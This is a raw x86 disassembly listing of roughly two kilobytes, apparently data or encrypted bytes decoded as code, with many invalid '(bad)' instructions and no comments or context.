  40e921:	test   BYTE PTR [edx-0x3b487440],dl
  40e927:	call   0x51f0:0x3f6c0fbc
  40e92e:	or     dh,BYTE PTR [esi+0x345281e8]
  40e934:	and    al,0x39
  40e936:	inc    ecx
  40e937:	mov    edx,DWORD PTR [edx+0x76b5f80e]
  40e93d:	mov    al,ds:0xd321b38b
  40e942:	xchg   ebx,eax
  40e943:	mov    esi,0xd2f27174
  40e948:	js     0x40e938
  40e94a:	jp     0x40e9b8
  40e94c:	add    edi,esi
  40e94e:	or     al,0x12
  40e950:	hlt    
  40e951:	xchg   esi,eax
  40e952:	outs   dx,DWORD PTR ds:[esi]
  40e953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e954:	dec    edi
  40e955:	cmp    BYTE PTR [esi-0x1d],0xf6
  40e959:	inc    ecx
  40e95a:	shl    DWORD PTR [ebp-0x49688e41],0x47
  40e961:	xchg   esp,eax
  40e962:	retf   0xea36
  40e965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e966:	cmp    DWORD PTR ds:0x67f93fb7,ebx
  40e96c:	mov    eax,ds:0x42a8b7c8
  40e971:	xor    ebp,esi
  40e973:	test   DWORD PTR [edi-0x11f5c4c2],0x68ab616d
  40e97d:	fiadd  WORD PTR [esi-0x1e385ce4]
  40e983:	xchg   esp,eax
  40e984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e985:	inc    ecx
  40e986:	jae    0x40e9b8
  40e988:	in     al,dx
  40e989:	lds    esp,FWORD PTR [edi+0x63787312]
  40e98f:	fdivr  st,st(2)
  40e991:	sbb    eax,0x22962da8
  40e996:	std    
  40e997:	inc    ecx
  40e998:	cmp    al,0x4d
  40e99a:	sub    eax,DWORD PTR [edx+0x5a4c151f]
  40e9a0:	call   FWORD PTR [ebx+0x1f]
  40e9a3:	xchg   esp,eax
  40e9a4:	adc    cl,BYTE PTR [ecx+0x641360b3]
  40e9aa:	stos   BYTE PTR es:[edi],al
  40e9ab:	jae    0x40e9d6
  40e9ad:	mov    al,fs:0x9be8017a
  40e9b3:	js     0x40e9d7
  40e9b5:	xchg   ebx,eax
  40e9b6:	aad    0xa5
  40e9b8:	cmp    BYTE PTR [eax-0x41b10412],dl
  40e9be:	mov    dh,0x23
  40e9c0:	ds aas 
  40e9c2:	push   gs
  40e9c4:	mov    ebp,0xb60ce88a
  40e9c9:	gs jae 0x40e9df
  40e9cc:	test   al,0xc0
  40e9ce:	push   ecx
  40e9cf:	inc    esi
  40e9d0:	ja     0x40e994
  40e9d2:	retf   
  40e9d3:	fist   DWORD PTR [edx]
  40e9d5:	push   ebp
  40e9d6:	mov    al,ds:0x98768eed
  40e9db:	loopne 0x40ea0c
  40e9dd:	cld    
  40e9de:	xchg   ecx,eax
  40e9df:	in     al,0x51
  40e9e1:	sbb    BYTE PTR [esi],cl
  40e9e3:	jge    0x40e975
  40e9e5:	int    0x43
  40e9e7:	cli    
  40e9e8:	bound  esi,QWORD PTR [edx-0x7e8fc464]
  40e9ee:	push   ebp
  40e9ef:	ja     0x40ea06
  40e9f1:	sahf   
  40e9f2:	js     0x40ea2b
  40e9f4:	mov    DWORD PTR [edi-0x200d7200],edi
  40e9fa:	mov    dl,0x4d
  40e9fc:	pop    edi
  40e9fd:	pop    edx
  40e9fe:	in     eax,dx
  40e9ff:	fisub  WORD PTR [ecx-0x67d56a43]
  40ea05:	daa    
  40ea06:	add    al,0x71
  40ea08:	or     ebx,DWORD PTR [ebx-0xf9ff9ef]
  40ea0e:	jb     0x40e9ac
  40ea10:	xchg   ecx,eax
  40ea11:	push   es
  40ea12:	pop    ss
  40ea13:	and    al,0xfe
  40ea15:	jmp    0x4e88f8f7
  40ea1a:	xchg   edi,eax
  40ea1b:	test   DWORD PTR [edi],ecx
  40ea1d:	inc    eax
  40ea1e:	or     edx,DWORD PTR [edx+0x45a0ccd7]
  40ea24:	sub    eax,ecx
  40ea26:	mov    cl,0xd6
  40ea28:	sti    
  40ea29:	ins    BYTE PTR es:[edi],dx
  40ea2a:	and    ebp,DWORD PTR gs:[ebx+esi*2-0x45]
  40ea2f:	(bad)  
  40ea30:	cmp    DWORD PTR ds:0xfa324b7b,ebx
  40ea36:	add    eax,0xeb0eb451
  40ea3b:	or     ecx,esi
  40ea3d:	sub    BYTE PTR [ebp+0x69],ah
  40ea40:	ret    0x44e5
  40ea43:	retf   0x2342
  40ea46:	ins    BYTE PTR es:[edi],dx
  40ea47:	sbb    BYTE PTR ds:0xc89e46da,dh
  40ea4d:	mov    bl,0x6c
  40ea4f:	shr    ebp,0x52
  40ea52:	cdq    
  40ea53:	dec    esp
  40ea54:	cmp    cl,BYTE PTR [eax]
  40ea56:	or     BYTE PTR [ebx+0xf2c4c84],dh
  40ea5c:	in     eax,dx
  40ea5d:	inc    edi
  40ea5e:	fs jnp 0x40ea7f
  40ea61:	and    al,0xa3
  40ea63:	scas   al,BYTE PTR es:[edi]
  40ea64:	jns    0x40ea3a
  40ea66:	inc    esp
  40ea67:	mov    esi,0xdf9b702a
  40ea6c:	sbb    cl,al
  40ea6e:	push   esp
  40ea6f:	xor    DWORD PTR [esi+0x59],edi
  40ea72:	pop    ss
  40ea73:	mov    ecx,0xb4180523
  40ea78:	jge    0x40ea4a
  40ea7a:	adc    DWORD PTR [edi],eax
  40ea7c:	add    edi,ebp
  40ea7e:	jo     0x40ea4a
  40ea80:	ret    0xb455
  40ea83:	mov    ds:0x82066a4,eax
  40ea88:	rcr    BYTE PTR [eax-0x6e631dd9],1
  40ea8e:	fld    DWORD PTR [ebx-0x76]
  40ea91:	mov    bh,0x9d
  40ea93:	inc    edx
  40ea94:	in     al,0xef
  40ea96:	mov    dh,0x92
  40ea98:	ins    BYTE PTR es:[edi],dx
  40ea99:	jl     0x40eada
  40ea9b:	sub    DWORD PTR [ecx],esi
  40ea9d:	push   ebp
  40ea9e:	mov    al,0xbc
  40eaa0:	(bad)  
  40eaa1:	jmp    0x40eaea
  40eaa3:	xchg   edi,eax
  40eaa4:	push   ecx
  40eaa5:	sub    bh,dl
  40eaa7:	mov    ecx,DWORD PTR [edx-0x1383e390]
  40eaad:	jmp    0x40ead6
  40eaaf:	int3   
  40eab0:	ud2    
  40eab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eab3:	jge    0x40eadf
  40eab5:	jmp    0x40eac1
  40eab7:	cmp    edx,0x86d2ac6b
  40eabd:	xchg   DWORD PTR [ebx],ebx
  40eabf:	inc    esp
  40eac0:	fsubp  st(2),st
  40eac2:	add    DWORD PTR ds:0xa66ed8ee,0x52
  40eac9:	bound  ecx,QWORD PTR [ebx+0x4095fdf9]
  40eacf:	cmp    ebx,ebp
  40ead1:	adc    BYTE PTR [edi-0x73b488fa],dl
  40ead7:	mov    esi,0xf76725c3
  40eadc:	lods   al,BYTE PTR ds:[esi]
  40eadd:	(bad)  
  40eade:	loope  0x40ea8a
  40eae0:	(bad)  
  40eae2:	cmp    eax,0x37c719c6
  40eae7:	pop    edi
  40eae8:	sbb    ecx,DWORD PTR [edx+0x8]
  40eaeb:	shr    BYTE PTR [ecx+esi*1-0x3c],0x9a
  40eaf0:	dec    esp
  40eaf1:	cmp    eax,0x1fef8045
  40eaf6:	jmp    0x24349662
  40eafb:	call   0xdab:0x84da241d
  40eb02:	mov    ecx,0xd17b9634
  40eb07:	adc    al,0x75
  40eb09:	sub    DWORD PTR [eax-0x437211a1],ebp
  40eb0f:	stos   DWORD PTR es:[edi],eax
  40eb10:	aas    
  40eb11:	jge    0x40eb55
  40eb13:	enter  0x3a89,0x39
  40eb17:	sbb    al,0x73
  40eb1a:	in     eax,0x96
  40eb1c:	pop    esp
  40eb1d:	scas   eax,DWORD PTR es:[edi]
  40eb1e:	outs   dx,BYTE PTR ds:[esi]
  40eb1f:	cwde   
  40eb20:	mov    esp,0x8bddcdb7
  40eb25:	xchg   esi,eax
  40eb26:	das    
  40eb27:	mov    ch,0x92
  40eb29:	in     eax,dx
  40eb2a:	inc    ecx
  40eb2b:	or     eax,0x29971181
  40eb30:	adc    al,0xc6
  40eb32:	aad    0xd6
  40eb34:	fcom   DWORD PTR [esi-0x2f]
  40eb37:	cwde   
  40eb38:	inc    ebx
  40eb39:	xor    esi,ecx
  40eb3b:	dec    ebx
  40eb3c:	push   ss
  40eb3d:	and    al,0x4
  40eb3f:	fist   WORD PTR ds:0xcea3df25
  40eb45:	mov    eax,ds:0xb06064c6
  40eb4a:	dec    esp
  40eb4b:	(bad)  
  40eb4c:	(bad)  
  40eb4d:	ret    0x318a
  40eb50:	into   
  40eb51:	popf   
  40eb52:	call   0x3225e248
  40eb57:	inc    ebx
  40eb58:	mov    bh,BYTE PTR [edi+esi*8+0x54]
  40eb5c:	xor    ch,BYTE PTR [eax-0x49]
  40eb5f:	pop    ss
  40eb60:	adc    eax,0x124f74de
  40eb65:	icebp  
  40eb66:	jl     0x40eb3e
  40eb68:	sub    DWORD PTR [esp+ecx*1+0x4e25a11f],ecx
  40eb6f:	mov    edx,esi
  40eb71:	fild   WORD PTR [edx+eiz*1]
  40eb74:	div    DWORD PTR [edx+0x75519372]
  40eb7a:	sahf   
  40eb7b:	out    0x81,al
  40eb7d:	enter  0xf98a,0x20
  40eb81:	sub    edi,DWORD PTR [ebp-0x16b429df]
  40eb87:	gs iret 
  40eb89:	icebp  
  40eb8a:	sub    al,0x9d
  40eb8c:	jp     0x40eb7f
  40eb8e:	jae    0x40ebf8
  40eb90:	outs   dx,DWORD PTR ds:[esi]
  40eb91:	mov    edx,0xf8de44d2
  40eb96:	es inc esp
  40eb98:	push   edi
  40eb99:	inc    edi
  40eb9a:	repz push ss
  40eb9c:	pop    ebp
  40eb9d:	aam    0x5f
  40eb9f:	adc    al,BYTE PTR [ebx]
  40eba1:	mov    cl,0xc0
  40eba3:	nop
  40eba4:	mov    ds:0x5aae9511,al
  40eba9:	sub    BYTE PTR [ecx-0x5a],ch
  40ebac:	mov    esi,0x8b229476
  40ebb1:	jmp    0x40ebf3
  40ebb3:	cdq    
  40ebb4:	stos   DWORD PTR es:[edi],eax
  40ebb5:	push   esp
  40ebb6:	xor    dh,0xf6
  40ebb9:	mov    esi,0x770152a7
  40ebbe:	loope  0x40eb5d
  40ebc0:	shl    BYTE PTR [eax+0x16c13f04],1
  40ebc6:	mov    esp,0xf21b7ba0
  40ebcb:	sti    
  40ebcc:	retf   
  40ebcd:	sub    dl,cl
  40ebcf:	jl     0x40ebde
  40ebd1:	push   ss
  40ebd2:	stc    
  40ebd3:	xor    al,0x2
  40ebd5:	in     eax,0x46
  40ebd7:	mov    esp,0xd8220329
  40ebdc:	mov    cl,0x85
  40ebde:	loop   0x40ebbf
  40ebe0:	out    dx,al
  40ebe1:	xchg   edi,eax
  40ebe2:	jns    0x32887312
  40ebe8:	xor    dh,BYTE PTR [edx]
  40ebea:	(bad)  
  40ebeb:	cdq    
  40ebec:	in     al,0x2
  40ebee:	jne    0x40eb83
  40ebf0:	pop    ds
  40ebf1:	test   eax,0x904d6d78
  40ebf6:	dec    eax
  40ebf7:	and    eax,0xcf6bedd6
  40ebfc:	pushf  
  40ebfd:	cwde   
  40ebfe:	or     BYTE PTR [ecx],al
  40ec00:	jecxz  0x40ebac
  40ec02:	ja     0x40ebce
  40ec04:	and    DWORD PTR [ebp-0x7a9f9b4d],esp
  40ec0a:	and    DWORD PTR [ebx+edx*8],ebp
  40ec0d:	push   cs
  40ec0e:	out    0x27,al
  40ec10:	dec    eax
  40ec11:	xor    ebx,DWORD PTR [ebp+0x5471d556]
  40ec17:	int    0x3d
  40ec19:	int    0x34
  40ec1b:	(bad)  
  40ec1c:	imul   edi,DWORD PTR [edx+ebp*2],0x76ca3843
  40ec23:	adc    al,0x7e
  40ec25:	or     eax,0x4b018194
  40ec2a:	das    
  40ec2b:	test   DWORD PTR [ebp+0x12c15a1a],ebp
  40ec31:	jge    0x40ec7f
  40ec33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec34:	dec    edx
  40ec35:	dec    ebp
  40ec36:	push   ecx
  40ec37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec38:	nop
  40ec39:	ja     0x40ec9e
  40ec3b:	in     al,dx
  40ec3c:	sti    
  40ec3d:	out    dx,eax
  40ec3e:	xlat   BYTE PTR ds:[ebx]
  40ec3f:	repz sub al,0xf5
  40ec42:	fwait
  40ec43:	sbb    DWORD PTR gs:[edi],edi
  40ec46:	push   ss
  40ec47:	xchg   esi,ebp
  40ec49:	mov    bh,0x3f
  40ec4b:	mov    ebp,DWORD PTR [ebx+0x13]
  40ec4e:	call   FWORD PTR [esi-0x4f]
  40ec51:	ror    ch,cl
  40ec53:	scas   eax,DWORD PTR es:[edi]
  40ec54:	push   0xb1b8b0d6
  40ec59:	das    
  40ec5a:	mov    dh,BYTE PTR [edx+0x51]
  40ec5d:	in     al,0x4b
  40ec5f:	push   0xffffffed
  40ec61:	mov    edi,0xa1b4bf79
  40ec66:	lods   eax,DWORD PTR ds:[esi]
  40ec67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec68:	out    dx,eax
  40ec69:	push   ebp
  40ec6a:	lds    esi,FWORD PTR [edi+0x49]
  40ec6d:	pop    esp
  40ec6e:	hlt    
  40ec6f:	repnz and eax,0xba91efd8
  40ec75:	dec    ebp
  40ec76:	pop    edi
  40ec77:	sbb    dl,BYTE PTR [edx-0x2ee48c0b]
  40ec7d:	retf   
  40ec7e:	das    
  40ec7f:	push   ds
  40ec80:	pop    ss
  40ec81:	in     al,0xc0
  40ec83:	inc    eax
  40ec84:	lock sti 
  40ec86:	inc    esi
  40ec87:	mov    bl,0xe6
  40ec89:	ins    DWORD PTR es:[edi],dx
  40ec8a:	test   al,0xf
  40ec8c:	aas    
  40ec8d:	test   bl,cl
  40ec8f:	inc    ebx
  40ec90:	sbb    ah,dh
  40ec92:	dec    ebp
  40ec93:	aas    
  40ec94:	stc    
  40ec95:	out    0xec,eax
  40ec97:	xchg   edx,eax
  40ec98:	cld    
  40ec99:	mov    ds,WORD PTR ds:0x3bf08d1e
  40ec9f:	adc    eax,esp
  40eca1:	test   eax,ebp
  40eca3:	adc    DWORD PTR [ecx+0x10],esi
  40eca6:	pop    es
  40eca7:	jb     0x40ec8a
  40eca9:	or     al,0xed
  40ecab:	lock mov eax,gs:0xc54ca953
  40ecb2:	es pop eax
  40ecb4:	or     esi,esp
  40ecb6:	add    eax,0x12a95bc0
  40ecbb:	cmc    
  40ecbc:	adc    cl,dh
  40ecbe:	mov    eax,0x90577426
  40ecc3:	rol    BYTE PTR [ebx],1
  40ecc5:	je     0x40ecf7
  40ecc7:	add    DWORD PTR [edx-0x63cb19a2],edx
  40eccd:	int3   
  40ecce:	jbe    0x40ec92
  40ecd0:	xlat   BYTE PTR ds:[ebx]
  40ecd1:	in     eax,0x5b
  40ecd3:	jnp    0x40ecbf
  40ecd5:	add    bh,BYTE PTR [ebp-0x7d89198a]
  40ecdb:	dec    esp
  40ecdc:	add    al,0xcc
  40ecde:	mov    ebx,0x1ddd5019
  40ece3:	dec    esi
  40ece4:	mov    edx,0x1444ccdc
  40ece9:	push   ss
  40ecea:	lods   al,BYTE PTR ds:[esi]
  40eceb:	xchg   DWORD PTR [ebp+0x258ff069],esp
  40ecf1:	popa   
  40ecf2:	push   ebp
  40ecf3:	push   ebx
  40ecf4:	ja     0x40ecfa
  40ecf6:	scas   al,BYTE PTR es:[edi]
  40ecf7:	or     esp,DWORD PTR [ebp-0x29]
  40ecfa:	fistp  WORD PTR [edi-0x53]
  40ecfd:	arpl   WORD PTR [edi+esi*2-0x7e],sp
  40ed01:	stos   DWORD PTR es:[edi],eax
  40ed02:	push   cs
  40ed03:	les    esi,FWORD PTR [ebx]
  40ed05:	and    eax,0xe5d10616
  40ed0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed0b:	out    0x7d,eax
  40ed0d:	jo     0x40ed33
  40ed0f:	pushf  
  40ed10:	dec    ebp
  40ed11:	loop   0x40ed2e
  40ed13:	xor    ebp,ebx
  40ed15:	cdq    
  40ed16:	test   eax,ecx
  40ed18:	(bad)  
  40ed1a:	fnsave [esi+0x1841044d]
  40ed20:	arpl   cx,sp
  40ed22:	(bad)  [ebx+edx*2+0xb8b9843]
  40ed29:	icebp  
  40ed2a:	(bad)  
  40ed2b:	mov    edi,0xa2e0f7cb
  40ed30:	mov    dl,0xac
  40ed32:	mov    eax,ds:0x13fe5fb
  40ed37:	das    
  40ed38:	xor    esi,DWORD PTR [ecx+eiz*8]
  40ed3b:	jmp    0x6bd6:0x8775316f
  40ed42:	(bad)
  40ed47:	push   esi
  40ed48:	dec    ebp
  40ed49:	ds aas 
  40ed4b:	jnp    0x40ed68
  40ed4d:	xor    cl,BYTE PTR [ecx+ecx*4+0x5aea76ba]
  40ed54:	xlat   BYTE PTR ds:[ebx]
  40ed55:	jo     0x40ed79
  40ed57:	cmp    DWORD PTR [eax-0x55353699],ebp
  40ed5d:	jp     0x40ed63
  40ed5f:	xchg   ecx,eax
  40ed60:	mov    ch,0x7d
  40ed62:	push   0x2d8c13e8
  40ed67:	fimul  WORD PTR [edx]
  40ed69:	scas   al,BYTE PTR es:[edi]
  40ed6a:	sar    BYTE PTR [esi+0x2e],0x6a
  40ed6e:	sub    al,BYTE PTR [edi+0x3a]
  40ed71:	je     0x40ed5e
  40ed73:	shr    DWORD PTR [edx-0x12],1
  40ed76:	sbb    DWORD PTR [eax],0xffffffef
  40ed79:	stos   DWORD PTR es:[edi],eax
  40ed7a:	mov    ds:0x5f499822,al
  40ed7f:	shl    dl,0x7d
  40ed82:	(bad)  
  40ed83:	add    eax,0x57220b3e
  40ed88:	add    eax,0x22989386
  40ed8d:	push   ds
  40ed8e:	xchg   ecx,eax
  40ed8f:	mov    bh,BYTE PTR [esi+0x56e46e76]
  40ed95:	push   es
  40ed96:	xchg   ebx,eax
  40ed97:	lahf   
  40ed98:	xor    eax,0x11884360
  40ed9d:	ret    
  40ed9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed9f:	lea    edx,[esi-0x14]
  40eda2:	pop    ds
  40eda3:	add    eax,DWORD PTR [ecx+0x72]
  40eda6:	aaa    
  40eda7:	and    ah,BYTE PTR [ebx+ecx*2-0x12386f8f]
  40edae:	push   ss
  40edaf:	fs xchg ebp,eax
  40edb1:	data16 int 0x4f
  40edb4:	(bad)  
  40edb6:	cmp    DWORD PTR [edi-0x26],0x19
  40edba:	xor    al,0xbb
  40edbc:	loopne 0x40ed55
  40edbe:	ret    
  40edbf:	fbld   TBYTE PTR [ebp+0xb]
  40edc2:	test   eax,0xba9f6e65
  40edc7:	in     al,dx
  40edc8:	and    BYTE PTR [ebp+0x40f2bd06],ah
  40edce:	xor    edi,DWORD PTR [ebp-0x70]
  40edd1:	ret    0xe380
  40edd4:	cli    
  40edd5:	ds inc edx
  40edd7:	adc    al,0x23
  40edd9:	push   ebx
  40edda:	jge    0x40ed6e
  40eddc:	out    dx,eax
  40eddd:	or     BYTE PTR [ecx],dl
  40eddf:	pop    ebp
  40ede0:	jmp    FWORD PTR [ebp-0x19]
  40ede3:	cmp    edi,ebx
  40ede5:	and    esp,DWORD PTR [ebp-0x39da3c59]
  40edeb:	add    al,0x33
  40eded:	cmp    edi,ebx
  40edef:	sub    al,0x7e
  40edf1:	test   BYTE PTR [edx],0xfd
  40edf4:	sti    
  40edf5:	fwait
  40edf6:	test   al,0x24
  40edf8:	idiv   dl
  40edfa:	mov    eax,ds:0xbcd93af2
  40edff:	inc    esi
  40ee00:	xor    al,0x13
  40ee02:	add    cl,0x8b
  40ee05:	push   es
  40ee06:	aam    0x83
  40ee08:	cld    
  40ee09:	bound  ecx,QWORD PTR [esi-0x79]
  40ee0c:	mov    ebp,0x160e58e0
  40ee11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee12:	fnsave [edi-0x5d5b2bcb]
  40ee18:	push   eax
  40ee19:	mov    cl,0x2e
  40ee1b:	test   DWORD PTR [ebx-0x20],ecx
  40ee1e:	imul   edx,DWORD PTR ds:0x59301207,0x21e6a044
  40ee28:	or     BYTE PTR [ecx*8-0x6888f8ca],0xda
  40ee30:	push   edi
  40ee31:	ss dec edi
  40ee33:	mov    ds:0x1a96b93,eax
  40ee38:	cmp    eax,0xc4a036f4
  40ee3d:	adc    dl,0x2f
  40ee40:	mov    WORD PTR [edi+0x42],cs
  40ee43:	pop    edi
  40ee44:	add    al,BYTE PTR [eax]
  40ee46:	sub    eax,0xdf047a9
  40ee4b:	mov    edx,0x34215526
  40ee50:	call   0x5a05:0x44fe396
  40ee57:	fsub   QWORD PTR [ecx+0x68]
  40ee5a:	and    al,0x26
  40ee5c:	push   edi
  40ee5d:	sub    eax,0xbbb2e4e7
  40ee62:	inc    ebx
  40ee63:	fidivr DWORD PTR [ecx-0x33]
  40ee66:	fcmovnb st,st(0)
  40ee68:	xchg   ecx,eax
  40ee69:	xchg   esi,eax
  40ee6a:	les    ecx,FWORD PTR [ebx-0x6c]
  40ee6d:	dec    ebx
  40ee6e:	rcr    BYTE PTR [edx+0x11f6a8e9],cl
  40ee74:	(bad)  
  40ee75:	in     eax,0xa9
  40ee77:	out    0x82,al
  40ee79:	push   ebp
  40ee7a:	adc    al,0x14
  40ee7c:	mov    al,0xa5
  40ee7e:	loope  0x40eedd
  40ee80:	inc    BYTE PTR [esi]
  40ee82:	add    dl,BYTE PTR [ebx+ecx*2+0x3527e84e]
  40ee89:	cmp    ebx,DWORD PTR [edi+0x35e21afe]
  40ee8f:	lea    esi,[eax+0x12ff0dc6]
  40ee95:	idiv   edx
  40ee97:	das    
  40ee98:	adc    ch,BYTE PTR [eax]
  40ee9a:	enter  0x1a76,0x77
  40ee9e:	sub    BYTE PTR [esi-0xb],dl
  40eea1:	push   ss
  40eea2:	out    0xe2,eax
  40eea4:	sbb    edx,DWORD PTR [ebp-0x58]
  40eea7:	loope  0x40eeaf
  40eea9:	stos   DWORD PTR es:[edi],eax
  40eeaa:	xchg   edx,eax
  40eeab:	ret    
  40eeac:	loop   0x40eea6
  40eeae:	add    esp,ecx
  40eeb0:	sub    bh,cl
  40eeb2:	sub    ecx,DWORD PTR [edx+0x23b179b2]
  40eeb8:	ds dec ebp
  40eeba:	mov    al,0x88
  40eebc:	jo     0x40eee6
  40eebe:	cwde   
  40eebf:	rcr    ecx,cl
  40eec1:	inc    edx
  40eec2:	pop    edi
  40eec3:	adc    DWORD PTR [esi],ebx
  40eec5:	sbb    DWORD PTR [ecx],0x7f
  40eec8:	fcmovu st,st(2)
  40eeca:	inc    ebx
  40eecb:	and    BYTE PTR [edi],0x71
  40eece:	das    
  40eecf:	aam    0xc0
  40eed1:	cmc    
  40eed2:	xchg   esp,eax
  40eed3:	xor    ebp,DWORD PTR [edi*2-0x2be7420]
  40eeda:	addr16 mov al,ds:0x6892
  40eede:	jl     0x40ef30
  40eee0:	daa    
  40eee1:	mov    ss,WORD PTR [edi-0x59a8e004]
  40eee7:	stos   BYTE PTR es:[edi],al
  40eee8:	out    dx,eax
  40eee9:	push   ebp
  40eeea:	lods   al,BYTE PTR ds:[esi]
  40eeeb:	mov    cl,0xf5
  40eeed:	sahf   
  40eeee:	mov    WORD PTR [edi-0x71],ds
  40eef1:	pusha  
  40eef2:	inc    esi
  40eef3:	dec    edx
  40eef4:	loop   0x40ef40
  40eef6:	js     0x40ef5e
  40eef8:	sub    BYTE PTR [ebp+0x581331a2],bl
  40eefe:	sahf   
  40eeff:	in     eax,dx
  40ef00:	bound  edi,QWORD PTR [esi+0x7ebdc472]
  40ef06:	inc    eax
  40ef07:	mov    cl,0xa4
  40ef09:	femms  
  40ef0b:	push   ds
  40ef0c:	in     eax,dx
  40ef0d:	pop    eax
  40ef0e:	pop    esp
  40ef0f:	or     eax,0xd03713d5
  40ef14:	shl    DWORD PTR [edi-0x36],cl
  40ef17:	push   ss
  40ef18:	mov    ah,0xd6
  40ef1a:	loopne 0x40eeb1
  40ef1c:	pop    esi
  40ef1d:	aad    0xd
  40ef1f:	fdiv   QWORD PTR [ecx+0x57816f3f]
  40ef25:	mov    esi,0x94284d21
  40ef2a:	das    
  40ef2b:	push   cs
  40ef2c:	mov    eax,DWORD PTR [esi-0x626f4d8c]
  40ef32:	pop    edx
  40ef33:	hlt    
  40ef34:	leave  
  40ef35:	les    edx,FWORD PTR [eax+ebp*1+0x40]
  40ef39:	add    BYTE PTR [esi-0x6780cb49],bl
  40ef3f:	mov    ah,0xd1
  40ef41:	inc    eax
  40ef42:	dec    edi
  40ef43:	push   esp
  40ef44:	cmc    
  40ef45:	ds (bad) 
  40ef47:	fisubr WORD PTR [esi+0x6f6255ac]
  40ef4d:	add    BYTE PTR ds:0x402c8c92,cl
  40ef53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef54:	jae    0x40ef28
  40ef56:	mov    bh,0xf0
  40ef58:	jg     0x40ef66
  40ef5a:	pop    ds
  40ef5b:	and    al,dh
  40ef5d:	test   BYTE PTR [ebp+edx*8+0x5e],ah
  40ef61:	mov    bl,0x8d
  40ef63:	adc    al,0x14
  40ef65:	stos   BYTE PTR es:[edi],al
  40ef66:	inc    ecx
  40ef67:	adc    esi,ecx
  40ef69:	stos   BYTE PTR es:[edi],al
  40ef6a:	xchg   edx,eax
  40ef6b:	les    ebp,FWORD PTR [edx+0x5d]
  40ef6e:	xchg   ebx,eax
  40ef6f:	xchg   edi,eax
  40ef70:	pop    ebp
  40ef71:	nop
  40ef72:	int3   
  40ef73:	out    0xff,al
  40ef75:	add    eax,0x9d6e12b8
  40ef7a:	or     al,dl
  40ef7c:	mov    dh,0x55
  40ef7e:	fist   WORD PTR [ebp+0x78efd5ce]
  40ef84:	cmp    al,BYTE PTR [eax+ebx*1]
  40ef87:	push   es
  40ef88:	cmc    
  40ef89:	adc    eax,0x667de8c1
  40ef8e:	pop    edx
  40ef8f:	add    DWORD PTR [eax-0x53120860],ecx
  40ef95:	jnp    0x40ef8e
  40ef97:	or     DWORD PTR [edi+0x8],eax
  40ef9a:	bound  ebp,QWORD PTR [ebp+0x6a]
  40ef9d:	in     al,0x7e
  40ef9f:	push   ds
  40efa0:	sahf   
  40efa1:	jle    0x40f020
  40efa3:	cli    
  40efa4:	addr16 jo 0x40efba
  40efa7:	cli    
  40efa8:	cmp    BYTE PTR [edi],dl
  40efaa:	xchg   ecx,eax
  40efab:	and    al,ch
  40efad:	adc    DWORD PTR [ebx],ebx
  40efaf:	enter  0xa8f0,0xda
  40efb3:	iret   
  40efb4:	xlat   BYTE PTR ds:[ebx]
  40efb5:	push   ebp
  40efb6:	mov    esp,0xc2194c84
  40efbb:	popf   
  40efbc:	mov    DWORD PTR [esi+0x7a7dcc2c],ebx
  40efc2:	neg    ebp
  40efc4:	mov    ebp,0x4fa4681f
  40efc9:	jne    0x40f02c
  40efcb:	xchg   edx,eax
  40efcc:	jecxz  0x40ef65
  40efce:	or     eax,0xc5b87e02
  40efd3:	mov    ch,0xb2
  40efd5:	cld    
  40efd6:	pop    ebp
  40efd7:	js     0x40f021
  40efd9:	and    edx,DWORD PTR [edi-0xf]
  40efdc:	fdiv   DWORD PTR [edi+0x36]
  40efdf:	das    
  40efe0:	pop    es
  40efe1:	or     al,0xe1
  40efe3:	adc    DWORD PTR [ebx+0x262c5143],ebp
  40efe9:	mov    esp,DWORD PTR [ebx]
  40efeb:	(bad)  
  40efed:	mov    eax,0xaed0dcd0
  40eff2:	es jne 0x40effd
  40eff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eff6:	lea    esi,[ebp+0x4b6631d1]
  40effc:	ja     0x40f055
  40effe:	mov    esp,0xb2e408d7
  40f003:	push   ss
  40f004:	xor    BYTE PTR [ebp-0x7bbfc59d],0x24
  40f00b:	pop    ebx
  40f00c:	(bad)  
  40f00d:	imul   eax,DWORD PTR [ebx-0x26],0x5bd9afc9
  40f014:	int3   
  40f015:	call   0x3dd29fa6
  40f01a:	mov    ds:0x2febdc3,al
  40f01f:	stos   DWORD PTR es:[edi],eax
  40f020:	mov    ch,0xb2
  40f022:	jmp    0x40f06e
  40f024:	push   ebx
  40f025:	mov    dh,0xd8
  40f027:	in     eax,dx
  40f028:	shl    DWORD PTR ds:0x9956f6df,1
  40f02e:	iret   
  40f02f:	mov    eax,0x6ed1cd0f
  40f034:	rol    BYTE PTR [eax+0x7f],1
  40f037:	das    
  40f038:	jns    0x40f097
  40f03a:	into   
  40f03b:	fnstcw WORD PTR [ebp+0x490d03a6]
  40f041:	or     dh,al
  40f043:	push   ebp
  40f044:	and    bh,BYTE PTR [edx]
  40f046:	pop    edx
  40f047:	repnz adc DWORD PTR [ebp-0x67],edx
  40f04b:	mov    ch,0xe5
  40f04d:	xchg   ebx,eax
  40f04e:	push   esi
  40f04f:	and    ch,ch
  40f051:	pop    esi
  40f052:	xchg   edx,eax
  40f053:	sbb    eax,eax
  40f055:	or     eax,DWORD PTR [esi+eax*1+0x31343e39]
  40f05c:	test   eax,0x1f9e85d8
  40f061:	out    0x84,al
  40f063:	pop    ebp
  40f064:	es adc al,0x28
  40f067:	in     al,0x71
  40f069:	push   eax
  40f06a:	mov    bh,0xed
  40f06c:	jne    0x40f093
  40f06e:	fxch   st(5)
  40f070:	xchg   ah,ah
  40f072:	fcom   DWORD PTR [ebp+ebp*1+0x60]
  40f076:	ror    ecx,0x6a
  40f079:	test   edi,ebx
  40f07b:	not    DWORD PTR [ebp-0x211ee304]
  40f081:	rcr    cl,cl
  40f083:	pop    edx
  40f084:	int3   
  40f085:	sbb    al,0x78
